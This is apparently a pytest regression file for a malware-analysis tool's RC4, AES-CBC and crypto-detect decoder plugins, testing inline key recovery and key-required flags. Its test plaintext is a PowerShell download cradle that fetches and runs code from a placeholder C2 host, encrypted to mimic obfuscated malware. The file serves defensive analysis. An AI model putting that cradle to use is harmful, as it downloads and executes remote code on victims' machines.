"""Symmetric-crypto plugin regression — AES-CBC / RC4 / crypto-detect.

Locks the P0.3 (RC3.0) contract:

  1. Auto-decrypt is attempted ONLY when a key literal is present in the
     SAME artifact (raw input). No cross-request, no brute-force.
  2. Analyst-supplied `key` arg (Chain-Recipe UI) always wins.
  3. When no key is recoverable, plugins return the ORIGINAL payload
     unchanged + emit a KEY REQUIRED tradecraft flag with the detected
     algorithm and required inputs.
  4. `crypto-detect` is a signal-only annotator — always fires on
     ciphertext-shaped blobs, never transforms data.
"""
from __future__ import annotations

import base64
from typing import Tuple

import pytest
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from crypto_hints import (
    detect_encryption_shape, extract_key_candidates, extract_iv_candidates,
)
from engine.registry import DecoderRegistry
from engine.models import AnalysisContext
from engine.fingerprint_util import compute as fp_compute


PLAINTEXT = b"IEX((New-Object Net.WebClient).DownloadString('http://c2/x'))"


# ── crypto_hints — key/IV recovery ──────────────────────────────────────
def test_extract_key_candidates_finds_quoted_ps_var():
    text = '$key = "mySecret123"; $ct = "AAAA"'
    ks = extract_key_candidates(text)
    assert b"mySecret123" in ks


def test_extract_key_candidates_ignores_nothing():
    """Empty input yields empty list, doesn't raise."""
    assert extract_key_candidates("") == []
    assert extract_key_candidates(None) == []


def test_extract_iv_candidates_only_16_bytes():
    text = '$iv = "0123456789ABCDEF"; $iv = "toolong-should-not-match-because-length"'
    ivs = extract_iv_candidates(text)
    assert b"0123456789ABCDEF" in ivs
    assert all(len(iv) == 16 for iv in ivs)


def test_detect_encryption_shape_aes():
    # 48 bytes = 3 AES blocks, high entropy
    raw = bytes(range(48))   # not really high-entropy but still tests shape
    shape = detect_encryption_shape(base64.b64encode(raw).decode())
    # Low-entropy blob shouldn't match AES tier (entropy < 6.5)
    assert shape is None or "AES-CBC/ECB" not in shape.get("algorithms", [])


def test_detect_encryption_shape_high_entropy():
    import os
    raw = os.urandom(64)      # cryptographically random
    shape = detect_encryption_shape(base64.b64encode(raw).decode())
    assert shape is not None
    assert "AES-CBC/ECB" in shape["algorithms"]
    assert shape["byte_len"] == 64


# ── RC4 plugin ──────────────────────────────────────────────────────────
def _rc4_encrypt(key: bytes, plain: bytes) -> bytes:
    cipher = Cipher(algorithms.ARC4(key), mode=None, backend=default_backend())
    enc = cipher.encryptor()
    return enc.update(plain) + enc.finalize()


def test_rc4_decrypts_with_inline_key_hint():
    key = b"topSecret1234567"
    ct = _rc4_encrypt(key, PLAINTEXT)
    payload = f'$key = "topSecret1234567"; $ct = "{base64.b64encode(ct).decode()}"'
    p = DecoderRegistry.get("rc4-decrypt")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    assert det.confidence >= 0.5, det.why
    res = p.decode(payload, det.args or {}, AnalysisContext())
    # The plugin operates on the WHOLE artifact — output includes decryption
    # notes; the plaintext should be visible in the output.
    assert "IEX" in res.output or "DownloadString" in res.output


def test_rc4_without_key_emits_key_required():
    key = b"secret-not-in-payload"
    ct = _rc4_encrypt(key, PLAINTEXT)
    payload = base64.b64encode(ct).decode()   # NO inline key literal
    p = DecoderRegistry.get("rc4-decrypt")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    # Detector still fires (low conf), decode returns original + KEY REQUIRED
    res = p.decode(payload, det.args or {}, AnalysisContext())
    assert res.output == payload
    flags = [t.flag for t in res.tradecraft]
    assert "rc4-key-required" in flags


def test_rc4_accepts_analyst_supplied_key():
    key = b"externalKey00001"
    ct = _rc4_encrypt(key, PLAINTEXT)
    payload = base64.b64encode(ct).decode()
    p = DecoderRegistry.get("rc4-decrypt")
    res = p.decode(payload, {"key": key.decode()}, AnalysisContext())
    assert "IEX" in res.output or "DownloadString" in res.output


# ── AES plugin ──────────────────────────────────────────────────────────
def _aes_cbc_encrypt(key: bytes, iv: bytes, plain: bytes) -> bytes:
    pad = 16 - (len(plain) % 16)
    padded = plain + bytes([pad]) * pad
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    return enc.update(padded) + enc.finalize()


def test_aes_cbc_decrypts_with_inline_key_and_iv():
    key = b"0123456789abcdef" * 2       # 32-byte AES-256 key
    iv = b"IVforTestingxxxx"            # 16-byte IV
    ct = _aes_cbc_encrypt(key, iv, PLAINTEXT)
    payload = (
        f'$key = "{key.decode()}"; '
        f'$iv  = "{iv.decode()}"; '
        f'$ct  = "{base64.b64encode(ct).decode()}"'
    )
    p = DecoderRegistry.get("aes-cbc-decrypt")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    assert det.confidence >= 0.5, det.why
    res = p.decode(payload, det.args or {}, AnalysisContext())
    assert "IEX" in res.output or "DownloadString" in res.output


def test_aes_without_key_emits_key_required():
    key = b"absent-from-payload-x"[:16]
    iv = b"randomIV00000000"
    ct = _aes_cbc_encrypt(key, iv, PLAINTEXT)
    payload = base64.b64encode(ct).decode()
    p = DecoderRegistry.get("aes-cbc-decrypt")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    res = p.decode(payload, det.args or {}, AnalysisContext())
    assert res.output == payload
    flags = [t.flag for t in res.tradecraft]
    assert "aes-key-required" in flags


def test_aes_accepts_analyst_supplied_key():
    key = b"ExternalAES-Key0" + b"\x00" * 0    # 16 bytes exact
    iv = b"\x00" * 16
    ct = _aes_cbc_encrypt(key, iv, PLAINTEXT)
    payload = base64.b64encode(ct).decode()
    p = DecoderRegistry.get("aes-cbc-decrypt")
    res = p.decode(
        payload,
        {"key": key.decode(), "iv": iv.hex(), "mode": "CBC"},
        AnalysisContext(),
    )
    assert "IEX" in res.output or "DownloadString" in res.output


# ── crypto-detect annotator ─────────────────────────────────────────────
def test_crypto_detect_flags_ciphertext_shape_without_key():
    import os
    payload = base64.b64encode(os.urandom(64)).decode()
    p = DecoderRegistry.get("crypto-detect")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    assert det.confidence > 0
    res = p.decode(payload, det.args or {}, AnalysisContext())
    # Signal-only — output passes through untouched
    assert res.output == payload
    flags = [t.flag for t in res.tradecraft]
    assert "crypto-key-required" in flags


def test_crypto_detect_ignores_plaintext():
    payload = "hello world this is plain english text"
    p = DecoderRegistry.get("crypto-detect")
    fp = fp_compute(payload)
    det = p.detect(payload, fp, AnalysisContext())
    assert det.confidence == 0.0


# ── No brute-force / no guessing ────────────────────────────────────────
def test_no_bruteforce_common_keys():
    """The plugin must NOT try common weak keys like 'password', 'admin',
    or key-of-length-0. Absence of an inline hint = no decrypt attempt."""
    key = b"password"      # dictionary word
    ct = _rc4_encrypt(key, PLAINTEXT)
    payload = base64.b64encode(ct).decode()
    # Zero inline key literal in payload
    p = DecoderRegistry.get("rc4-decrypt")
    res = p.decode(payload, {}, AnalysisContext())
    # MUST NOT have decrypted — output stays as-is
    assert res.output == payload
    flags = [t.flag for t in res.tradecraft]
    assert "rc4-key-required" in flags
